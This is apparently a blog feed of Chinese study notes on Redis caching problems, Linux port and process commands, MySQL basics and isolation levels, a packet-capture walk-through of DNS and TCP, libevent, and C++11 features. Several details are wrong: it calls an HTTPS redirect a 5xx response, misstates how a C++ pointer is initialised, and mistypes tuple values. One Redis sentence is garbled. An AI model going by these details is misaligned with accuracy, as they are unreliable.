<code>string</code>类型：value的字节数大于10KB；<code>Hash</code>/<code>set</code>/<code>Zset</code>/<code>list</code>等复杂数据结构类型：元素个数大于5000个或总value字节数大于10Mb</li></ul><p>危害：</p><ul><li>读取成本高</li><li>慢查询（过期、删除）</li><li>主从复制异常，服务阻塞，无法正常响应请求</li><li></li></ul><p>业务侧使用大key的表现</p><ul><li>请求Redis超时报错</li></ul><p>消除方法：</p><ul><li>压缩：<ul><li>压缩算法：gzip、snappy、lz4（选择合适的算法）</li><li>重点考虑解压缩时间（写少读多）</li><li>Json字符串可以考虑<code>MessagePack</code>算法（核心就是低于一个字节的就用一个字节存，如(int)250需要4个字节，可以压缩成为8位）序列化</li></ul></li><li>拆分：将大Key拆分成小key</li><li>集合类结构（hash、list、set、set）<ul><li>拆分：用hash取余、位掩码方式决定放的key</li><li>区分冷热：榜单列表场景使用zset，只缓存前10页数据，后续数据走db</li><li></li></ul></li></ul><h3 id="2-4-2-热key"><a href="#2-4-2-热key" class="headerlink" title="2.4.2 热key"></a>2.4.2 热key</h3><ul><li>热<code>key</code>: 用户访问一个Key的QPS特别高，导致<code>Server</code>实例出现突增或者不均的情况 </li><li>场景：分片机器，但是热<code>key</code>在一个机器，导致网站请求阻塞</li></ul><p>消除方法：</p><ul><li>使用Localcache：<ul><li>LocalCache：缓存过期管理，缓存分片，本机内存</li><li>在访问Redis前，在业务服务侧设置Localcache，降低访问Redis的QPS。LocalCache中缓存过期或未命中，则从Redis中将数据更新到LocalCache。</li></ul></li><li>拆分：将<code>Key:Value</code>这一个热<code>key</code>复制写入多份，但是可能存在数据不一致风险</li><li>Redis代理的热Key承载能力：使用代理统计，然后设置LLocalcache</li><li><h3 id="2-4-3-慢查询操作"><a href="#2-4-3-慢查询操作" class="headerlink" title="2.4.3 慢查询操作"></a>2.4.3 慢查询操作</h3></li><li><p>容易导致Redis慢查询操作</p><ul><li>(1)批量操作一次性传入过多的key/value，如mset/hmset/sadd/zadd等o(n)操作建议单批次不要超过100，超过100之后性能下降明显。</li><li>(2)zset大部分命令都是o(log(n))，当大小超过5k以上时，简单的zadd/zrem也可能导致慢查询</li><li>(3)操作的单个value过大,超过10KB。也即，避免使用大Key</li><li>(4)对大key的delete/ expire操作也可能导致慢查询，Redis4.0之前不支持异步删除unlink，大key删除会阻塞Redis</li></ul></li></ul><h3 id="2-4-4-缓存穿透、缓存雪崩"><a href="#2-4-4-缓存穿透、缓存雪崩" class="headerlink" title="2.4.4 缓存穿透、缓存雪崩"></a>2.4.4 缓存穿透、缓存雪崩</h3><p>缓存穿透:热点数据查询绕过缓存.直接查询数据库</p><ul><li>危害：<ul><li>(1)查询一个一定不存在的数据：通常不会缓存不存在的数据，这类查询请求都会直接打到db，如果有系统bug或人为攻击，ot那么容易导致db响应慢甚至宕机</li><li>(2)在高并发场景下，一个热key如果过期，会有大量请求同时击穿至db，容易影响db性能和稳定。同一时间有大量key集中过期时，也会导致大量请求落到db上，导致查询变慢，甚至出现db无法响应新的查询</li></ul></li></ul><p>如何减少缓存穿透</p><ul><li>缓存空值：如一个不存在的userID。这个id在缓存和数据库中都不存在。则可以缓存一个空值，下次再查缓存直接反空值。</li><li>布隆过滤器：通过bloom filter算法来存储合法Key,得益于该算法超高的压缩率，只需占用极小的空间就能存储大量key值</li></ul><p>缓存雪崩:大量缓存同时过期</p><p>如何避免缓存雪崩：</p><ul><li>将缓存失效时间分散开．比如在原有的失效时间基础上增加一个随机值﹐例加不同Ka讨期时间. 9573可以设置为10分1秒过期，10分23秒过期，10分8秒过期。单位秒部分就是随机时间．这样过期时间就分散了对于热点数据．过期时间尽量设置得长一些，冷门的数据可以相对设置过期时间短一些。</li><li>使用缓存集群,避免单机宕机造成的缓存雪崩。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux踩坑记录</title>
      <link href="/2023/01/25/Linux%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/01/25/Linux%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Vmware和WSL2无法一起开启"><a href="#1-Vmware和WSL2无法一起开启" class="headerlink" title="1 Vmware和WSL2无法一起开启"></a>1 Vmware和WSL2无法一起开启</h1><p>由于WSL2与VMware是不兼容的，需要使用以下命令选择</p><ul><li>启用Vmware:   <pre class="language-none"><code class="language-none">bcdedit &#x2F;set hypervisorlaunchtype off</code></pre></li><li>启用WSL2  <pre class="language-none"><code class="language-none">bcdedit &#x2F;set hypervisorlaunchtype auto</code></pre></li></ul><h1 id="2-端口占用相关"><a href="#2-端口占用相关" class="headerlink" title="2 端口占用相关"></a>2 端口占用相关</h1><h2 id="1-lsof"><a href="#1-lsof" class="headerlink" title="1. lsof"></a>1. lsof</h2><pre class="language-none"><code class="language-none">lsof -i:8080：查看8080端口占用lsof abc.txt：显示开启文件abc.txt的进程lsof -c abc：显示abc进程现在打开的文件lsof -c -p 1234：列出进程号为1234的进程所打开的文件lsof -g gid：显示归属gid的进程情况lsof +d &#x2F;usr&#x2F;local&#x2F;：显示目录下被进程开启的文件lsof +D &#x2F;usr&#x2F;local&#x2F;：同上，但是会搜索目录下的目录，时间较长lsof -d 4：显示使用fd为4的进程lsof -i -U：显示所有打开的端口和UNIX domain文件</code></pre><h2 id="2-netstat"><a href="#2-netstat" class="headerlink" title="2. netstat"></a>2. netstat</h2><p>netstat -tunlp | grep 端口号</p><ul><li>-t (tcp) 仅显示tcp相关选项</li><li>-u (udp)仅显示udp相关选项</li><li>-n 拒绝显示别名，能显示数字的全部转化为数字</li><li>-l 仅列出在Listen(监听)的服务状态</li><li>-p 显示建立相关链接的程序名</li></ul><h2 id="3-kill"><a href="#3-kill" class="headerlink" title="3. kill"></a>3. kill</h2><p>杀掉对应相关进程<br><pre class="language-none"><code class="language-none">kill -9 pid</code></pre></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/05/2022-12-05/"/>
      <url>/2022/12/05/2022-12-05/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySql 学习笔记</title>
      <link href="/2022/11/22/MySql-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/11/22/MySql-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="1-基本语句操作"><a href="#1-基本语句操作" class="headerlink" title="1. 基本语句操作"></a>1. 基本语句操作</h1><h2 id="1-1-数据库操作"><a href="#1-1-数据库操作" class="headerlink" title="1.1 数据库操作"></a>1.1 数据库操作</h2><ul><li><p>创建数据库</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">database</span> 数据库名<span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">database</span> stu_a<span class="token punctuation">;</span><span class="token comment">-- 在建库时指定字符集，避免中文数据乱码的问题</span><span class="token keyword">create</span> <span class="token keyword">database</span> stu_b <span class="token keyword">default</span> <span class="token keyword">charset</span><span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">;</span></code></pre></li><li><p>显示数据库结构</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">create</span> <span class="token keyword">database</span> 数据库名<span class="token punctuation">;</span></code></pre><p>查看数据库的相关信息（例如默认字符集等信息）</p></li><li><p>删除数据库</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">database</span> 数据库名<span class="token punctuation">;</span></code></pre></li></ul><h2 id="1-2-表操作"><a href="#1-2-表操作" class="headerlink" title="1.2 表操作"></a>1.2 表操作</h2><ul><li>创建数据库表</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Use</span> 数据库名；<span class="token keyword">use</span> student<span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> stu<span class="token punctuation">(</span>id <span class="token keyword">int</span><span class="token punctuation">,</span>name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">create</span> <span class="token keyword">table</span> stuinfo<span class="token punctuation">(</span>    id <span class="token keyword">int</span><span class="token punctuation">,</span>    name <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    address <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    city <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    age <span class="token keyword">int</span><span class="token punctuation">,</span>    love <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">default</span> <span class="token keyword">charset</span><span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">;</span></code></pre><ul><li>显示表结构</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">desc</span> 表名<span class="token punctuation">;</span> <span class="token comment">-- 即可查看指定表的结构</span><span class="token keyword">show</span> <span class="token keyword">create</span> <span class="token keyword">table</span> 表名<span class="token punctuation">;</span> <span class="token comment">-- 查看指定表的详细信息</span></code></pre><ul><li><p>删除表</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">table</span> 表名<span class="token punctuation">;</span></code></pre></li><li><p>删除字段</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">table</span> 表名 <span class="token keyword">drop</span> 字段名</code></pre></li><li><p>添加新字段</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">table</span> 表名 <span class="token keyword">add</span> 新字段名 新数据类型 <span class="token punctuation">[</span>新约束条件<span class="token punctuation">]</span></code></pre></li><li><p>修改字段名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">table</span> 表名 change 旧字段名 新字段名 新数据类型</code></pre></li><li><p>修改数据类型</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">table</span> 表名 <span class="token keyword">modify</span> 字段名 新数据类型</code></pre></li><li><p>修改表名</p></li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">rename</span> <span class="token keyword">table</span> 旧表名 <span class="token keyword">to</span> 新表名</code></pre><h2 id="1-3-数据的增、删、改、查"><a href="#1-3-数据的增、删、改、查" class="headerlink" title="1.3 数据的增、删、改、查"></a>1.3 数据的增、删、改、查</h2><ul><li><p>表记录插入</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> 表名<span class="token punctuation">(</span>字段列表<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span>值列表<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> stu<span class="token punctuation">(</span>id<span class="token punctuation">,</span>name<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'newdream'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> stu <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'newdream1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>一次插入多条记录</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> 表名<span class="token punctuation">(</span>字段列表<span class="token punctuation">)</span> <span class="token keyword">values</span> <span class="token punctuation">(</span>值列表<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>值列表<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>（值列表n）<span class="token punctuation">;</span> <span class="token keyword">insert</span> <span class="token keyword">into</span> stu <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'new1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'new2'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'new3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>使用insert.. select 插入结果</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> 目标表名<span class="token punctuation">(</span>字段列表<span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">select</span><span class="token punctuation">(</span>字段列表<span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">from</span> 源表 <span class="token keyword">where</span> 条件表达式 <span class="token keyword">insert</span> <span class="token keyword">into</span> stu_bak<span class="token punctuation">(</span>id<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token keyword">select</span> id<span class="token punctuation">,</span>newname <span class="token keyword">from</span> stu <span class="token keyword">where</span> id<span class="token operator">></span><span class="token number">2</span><span class="token punctuation">;</span></code></pre><p>注意：字段列表1与字段列表2的字段个数必须相同，且对应字段的数据类型尽量保持一致。</p></li><li><p>复制表结构及数据到新表</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> 新表 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> 旧表<span class="token punctuation">;</span></code></pre></li><li><p>只复制表结构到新表</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> 新表 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> 旧表 <span class="token keyword">where</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span></code></pre></li><li><p>修改表记录</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> 表名 <span class="token keyword">set</span> 字段名<span class="token number">1</span><span class="token operator">=</span>值<span class="token number">1</span><span class="token punctuation">,</span>字段名<span class="token number">2</span><span class="token operator">=</span>值<span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>字段名n<span class="token operator">=</span>值n<span class="token punctuation">[</span><span class="token keyword">where</span> 条件表达式<span class="token punctuation">]</span> <span class="token keyword">update</span> stu <span class="token keyword">set</span> newname<span class="token operator">=</span><span class="token string">'new5'</span> <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></code></pre></li><li><p>使用delete 删除表记录</p></li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">delete</span> <span class="token keyword">from</span> 表名 <span class="token keyword">where</span> 条件表达式<span class="token punctuation">;</span></code></pre><ul><li>使用truncate清空表记录<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">truncate</span> <span class="token keyword">table</span> 表名<span class="token punctuation">;</span></code></pre></li></ul><h2 id="1-4-基础查询"><a href="#1-4-基础查询" class="headerlink" title="1.4 基础查询"></a>1.4 基础查询</h2><ul><li>查询语句<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> 字段列表<span class="token keyword">from</span> 数据源<span class="token punctuation">[</span> <span class="token keyword">where</span> 条件表达式 <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token keyword">group</span> <span class="token keyword">by</span> 分组字段<span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token keyword">having</span>条件表达式 <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token keyword">order</span> <span class="token keyword">by</span> 排序字段 <span class="token punctuation">[</span> <span class="token keyword">asc</span> <span class="token operator">|</span> <span class="token keyword">desc</span> <span class="token punctuation">]</span> <span class="token punctuation">]</span></code></pre></li></ul><h1 id="2-事务相关"><a href="#2-事务相关" class="headerlink" title="2 事务相关"></a>2 事务相关</h1><ul><li>脏读：读取未提交数据</li><li>不可重复读：前后多次读取，数据内容不一致</li><li><p>幻读：前后多次读取，数据总量不一致</p><p>| 隔离级别 | 脏读 | 不可重复读 | 幻读 |<br>| ————————————- | ———-| —————— | ——— |<br>| 读未提交 | 可能 | 可能 | 可能 |<br>| 读已提交 | 不可能 | 可能 | 可能 |<br>| 重复读 | 不可能 | 不可能 | 可能 |<br>| 串行化 | 不可能 | 不可能 | 不可能 | </p></li></ul><h1 id="减少行锁对性能影响"><a href="#减少行锁对性能影响" class="headerlink" title="减少行锁对性能影响"></a>减少行锁对性能影响</h1><ul><li><p>两阶段锁协议</p><p>  在InoDB事务中，行锁是在需要的时候才加上的，但并不是不需要了就立刻释放，而是要等到事务结束时才释放。这个就是两阶段锁协议 。</p><p>  所以：如果事务中需要锁多个行，要把最可能造成锁冲突、最可能影响并发度的锁尽量往后放。</p></li><li><p>死锁和死锁检测</p><p>  当并发系统中不同线程出现循环资源依赖，涉及的线程都在等待别的线程释放资源时，就会导致这几个线程都进入无限等待的状态，称为死锁。</p><p>  当出现死锁以后，有两种策略：</p><ul><li>一：直接进入等待，直到超时。这个超时时间可以通过参数<code>innodb_lock_wait_timeout</code>（默认值是50s）来设置。</li><li>二：发起死锁检测，发现死锁后，主动回滚死锁链条中的某一个事务，让其他事务得以继续执行。将参数<code>innodb_deadlock_detect</code>设置为<code>on</code>，表示开启这个逻辑。</li></ul></li></ul><h1 id="事务隔离"><a href="#事务隔离" class="headerlink" title="事务隔离"></a>事务隔离</h1>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络（库）学习&amp;实践记录</title>
      <link href="/2022/11/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/11/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>背八股文经常忘记，咨询学长之后，学长建议我一边实践一边记录，理解的更透彻一点。</p><h1 id="1-浏览器访问访问网络发生了什么？"><a href="#1-浏览器访问访问网络发生了什么？" class="headerlink" title="1.浏览器访问访问网络发生了什么？"></a>1.浏览器访问访问网络发生了什么？</h1><h2 id="1-获取网络的ip地址"><a href="#1-获取网络的ip地址" class="headerlink" title="1. 获取网络的ip地址"></a>1. 获取网络的ip地址</h2><p>查看浏览器缓存 -&gt; 本机host文件 -&gt; DNS(以下是DNS详细步骤)</p><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><p>以访问常用的baidu为例，在抓到的包里面看，会发现存在以下四个包，选择第42个包之后会出现一些内容。<br><img src="1.1.1.png" alt=""></p><p>这个数据包包含数据链路层报文头（数据链路层），ip层头（网络层），udp头（传输层），dns头（应用层）。</p><ul><li>在第二行是数据链路层，包含了从电脑mac地址到路由器mac地址去，然后路由器mac地址转发。</li><li>在第三行是IP地址端，为了方便分析，我特意把ipv6选项关闭，只剩下了ipv4。</li><li>在第四行是UDP，对于DNS来说，由于是使用的UDP协议，虽然有校验和字段，但是不经过检验。<img src="1.1.2.png" alt=""></li><li>第五行就是DNS，看出我们要查询的是<code>www.baidu.com</code>，这里的<code>type A</code>指的是主机地址，还有常用的是<code>CNAME</code>指的是别名的正则名称。<code>Class in</code>指的是互联网，还有其他的字段指的比较早期的网络通信协议或者背废弃的通信协议。在下图我使用的是第43个包，可以看到有一个<code>retransmitted request</code>，这个是一种数据传输错误控制方法，使用确认消息和超时来实现不可靠服务的可靠数据传输。我们观察到dns没有在一定时间内回复，于是就启动了ARQ。<br><img src="1.1.3-dns.png" alt=""></li></ul><h3 id="回答"><a href="#回答" class="headerlink" title="回答"></a>回答</h3><p>回答和发送请求差不多，他会将请求的域名重复一遍，answer应答了我们请求的网站对应的IP地址，于是我们就知道了访问网站的ip地址。<br><img src="1.1.4-response.png" alt=""></p><h2 id="2-TCP-握手"><a href="#2-TCP-握手" class="headerlink" title="2. TCP 握手"></a>2. TCP 握手</h2><p>可以看出TCP三次握手的操作<br><pre class="language-none"><code class="language-none">C -&gt; S ：SYNS -&gt; C : SYN , ACKC -&gt; S : ACK</code></pre><br>完成操作。<br><img src="1.2.1.png" alt=""></p><h2 id="3-http-https"><a href="#3-http-https" class="headerlink" title="3. http/https"></a>3. http/https</h2><p>经过三次握手成功建立连接后，开始传送数据，如果是http协议的话，开始传送数据；如果不是，就会返回一个5开头的的重定向消息，告诉我们用的是https，那就是说IP没变，但是端口号从80变成443了，然后四次挥手。<br>之后将端口变成443再来一次tcp握手。</p><h2 id="4-断开连接的TCP-挥手"><a href="#4-断开连接的TCP-挥手" class="headerlink" title="4. 断开连接的TCP 挥手"></a>4. 断开连接的TCP 挥手</h2><p>以下是TCP四次挥手</p><pre class="language-none"><code class="language-none">C -&gt; S : FIN , ACKS -&gt; C : ACKS -&gt; C : FIN , ACKC -&gt; S : ACK</code></pre><p><img src="1.2.2.png" alt=""></p><h1 id="2-libevent"><a href="#2-libevent" class="headerlink" title="2. libevent"></a>2. libevent</h1><p>I/O框架库要么以Reactor模式实现，要么以Proactor模式实现，一般包含句柄（Handle），事件多路分发器（EventDemultiplexer）、事件处理器（EventHandler）和具体事件处理器（ConcreteEventHandler）、Reactor。</p><ul><li>句柄： 事件源（I/O事件，信号和定时事件），通常和句柄绑定，当内核检测到就绪事件时，将通过句柄通知应用程序。Linux下，I/O事件得句柄是文件描述符，信号事件对应得句柄是信号值</li><li>事件多路分发器：内部调用<code>select</code>,<code>poll</code>,<code>epoll_wait</code>函数</li><li>事件处理器和具体事件处理器：事件处理器执行事件对应得业务逻辑。通常包含多个<code>handle_event</code>回调函数。I/O框架库提供得事件处理器是一个接口，用户要继承它来实现自己的事件处理器，并且包含一个<code>get_handle</code>方法。</li><li>Reactor 这个是I/O框架的核心。<ul><li>handle_events：执行事件循环-&gt;等待事件，依次处理所有就绪事件对应的事件处理器。</li><li>register_handler： 调用多路分发器的<code>register_event</code>向事件多路分发器注册事件。</li><li>remove_handler：删除事件多路分发器中的一个事件</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c++11&amp;14 新特性</title>
      <link href="/2022/11/08/c-11-14-%E6%96%B0%E7%89%B9%E6%80%A7/"/>
      <url>/2022/11/08/c-11-14-%E6%96%B0%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="template"><a href="#template" class="headerlink" title="template"></a>template</h2><h3 id="Variadic-Templates"><a href="#Variadic-Templates" class="headerlink" title="Variadic Templates"></a>Variadic Templates</h3><pre class="language-c++" data-language="c++"><code class="language-c++">template&lt;typename T, typename... Types&gt;void print(const Types&amp;... args);    &#x2F;&#x2F;函数能接受任意参数，并且参数可以接受任意类型</code></pre><ul><li><p>可以用来写递归调用，需要写一个处理最后情况的函数。</p>  <pre class="language-c++" data-language="c++"><code class="language-c++">template&lt;typename T, typename... Types&gt;void print(const T&amp; firstArg,const Types&amp;... args)&#123;    cout &lt;&lt;firstArg;    print(args...);&#125;void print()&#123;&#125;</code></pre></li><li><p>递归继承</p><p>参考tuple的实现方式。</p><pre class="language-c++" data-language="c++"><code class="language-c++">tuple&lt;int,float,string&gt; t(41 , 6.13 , &quot;hello&quot;);t.head() -&gt;41t.tail().head() -&gt; 3.13</code></pre></li><li>其他 TODO</li></ul><h3 id="space-template-expresion"><a href="#space-template-expresion" class="headerlink" title="space template expresion"></a>space template expresion</h3><pre class="language-c++" data-language="c++"><code class="language-c++">vector&lt;list&lt;int&gt; &gt; &#x2F;&#x2F;old versionvector&lt;list&lt;int&gt;&gt; &#x2F;&#x2F;new version</code></pre><h3 id="alias-template"><a href="#alias-template" class="headerlink" title="alias template"></a>alias template</h3><pre class="language-c++" data-language="c++"><code class="language-c++">template&lt;typename T&gt;using vec &#x3D; std::vector&lt;T, MyAlloc&lt;T&gt;&gt;;vec&lt;int&gt; coll;</code></pre><h3 id="nullptr-and-std-nullptr-t"><a href="#nullptr-and-std-nullptr-t" class="headerlink" title="nullptr and std::nullptr_t"></a>nullptr and std::nullptr_t</h3><p>可以用<code>nullptr</code> 代替 <code>0</code> 或者 <code>NULL</code><br><pre class="language-c++" data-language="c++"><code class="language-c++">void f(int);void f(void *);f(0);       &#x2F;&#x2F; f(int);f(NULL);    &#x2F;&#x2F; f(int);f(nullptr); &#x2F;&#x2F; f(void *);</code></pre></p><h2 id="initialization"><a href="#initialization" class="headerlink" title="initialization"></a>initialization</h2><h3 id="uniform-initialization"><a href="#uniform-initialization" class="headerlink" title="uniform initialization"></a>uniform initialization</h3><pre class="language-c++" data-language="c++"><code class="language-c++">int values[]&#123;1, 2, 3&#125;;vector&lt;string&gt;&#123;&quot;Ber&quot;, &quot;New&quot;&#125;;complex&lt;double&gt; c&#123;4.0, 3.0&#125;;</code></pre><h3 id="initializer-list"><a href="#initializer-list" class="headerlink" title="initializer list"></a>initializer list</h3><pre class="language-c++" data-language="c++"><code class="language-c++">int i ; &#x2F;&#x2F;undefined valueint j&#123;&#125;;&#x2F;&#x2F; j is intialized by 0int* p; &#x2F;&#x2F;undefinedint* q;&#x2F;&#x2F;q is initialized by nullptr</code></pre><p>使用的是<code>std::initialized_list&lt;&gt;</code>实现。</p><h2 id="explicit-for-ctors-taking-more-than-one-argument"><a href="#explicit-for-ctors-taking-more-than-one-argument" class="headerlink" title="explicit for ctors taking more than one argument"></a>explicit for ctors taking more than one argument</h2><pre class="language-c++" data-language="c++"><code class="language-c++">explicit &#x2F;&#x2F;主要使用于构造函数，取消隐式转换</code></pre><h2 id="default-delete"><a href="#default-delete" class="headerlink" title="=default , =delete"></a>=default , =delete</h2><p>自定义一个<code>ctor</code>，编译器不会给你一个<code>default</code>。<br>如果强制加上<code>=default</code>，就可以重新获得并使用</p><pre class="language-c++" data-language="c++"><code class="language-c++">class zoo&#123;public:  zoo(int i1, int i2):d1(i1), d2(i2)&#123;&#125;  zoo(const Zoo &amp;) &#x3D; delete;  zoo(zoo &amp;&amp;) &#x3D; default;    &#x2F;&#x2F;&amp;&amp;右值引用  zoo &amp;operator&#x3D;(const zoo &amp;) &#x3D; default;  zoo &amp;operator&#x3D;(const zoo &amp;&amp;) &#x3D; delete; &#x2F;&#x2F;&amp;&amp;右值引用  virtual ~zoo()&#123;&#125;private:  int d1, d2;&#125;</code></pre><h2 id="noexcept"><a href="#noexcept" class="headerlink" title="noexcept"></a>noexcept</h2><p>异常若未被处理，会上传到调用方；若最终没有处理，会调用<code>std::terminate()</code>，最终执行<code>std::abort()</code>;</p><p>对于<code>std::vector</code>中的<code>move constructor and destructor</code>，必须要加上<code>noexcept</code>才会被调用；在<code>vector</code> grow(只有 <code>vector</code> 和 <code>deque</code>)过程中，会优先调用<code>move constructor and destructor</code>;</p><h2 id="override"><a href="#override" class="headerlink" title="override"></a>override</h2><p>应用于虚函数，方便排查错误（想使用多态但是使用了virtual）</p><h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><p>继承体系中的最后一个 </p><h2 id="auto"><a href="#auto" class="headerlink" title="auto"></a>auto</h2><h2 id="decltype"><a href="#decltype" class="headerlink" title="decltype"></a>decltype</h2><p>1、申明<code>return type</code><br><pre class="language-c++" data-language="c++"><code class="language-c++">template&lt;typename T1, typename T2&gt;auto add(T1 x, T2 y) -&gt; decltype(x + y);</code></pre></p><p>2、使用在<code>metaprogramming</code></p><pre class="language-c++" data-language="c++"><code class="language-c++">typedef typename decltype(obj)::iterator iType;</code></pre><p>3、pass the type of a lambda<br><pre class="language-c++" data-language="c++"><code class="language-c++">auto cmp &#x3D; [](const person&amp; p1, const person&amp; p2)&#123;    return p1.lastname() &lt; p2 .lastname();&#125;;std::set&lt;person, decltype(cmp)&gt; coll(cmp);</code></pre></p><h2 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h2><pre class="language-c++" data-language="c++"><code class="language-c++">[]&#123;    std::cout &lt;&lt; &quot;hello&quot; &lt;&lt; std::endl;&#125;(); &#x2F;&#x2F;print helloauto l &#x3D; []&#123;    std::cout &lt;&lt; &quot;hello&quot; &lt;&lt; std::endl;&#125;;l();  &#x2F;&#x2F;print hello</code></pre><h2 id="右值引用"><a href="#右值引用" class="headerlink" title="右值引用"></a>右值引用</h2><ul><li><code>Lvalue</code>: 可以出现在<code>operator =</code> 左侧</li><li><code>Rvalue</code>: 只能出现在<code>operator =</code> 右侧</li></ul><p>类似于在拷贝过程中使用浅拷贝，右值引用主要使用于<code>ctor</code>中，只更换指针。</p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>STL学习</title>
      <link href="/2022/10/15/STL%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/10/15/STL%E5%AD%A6%E4%B9%A0/</url>
      
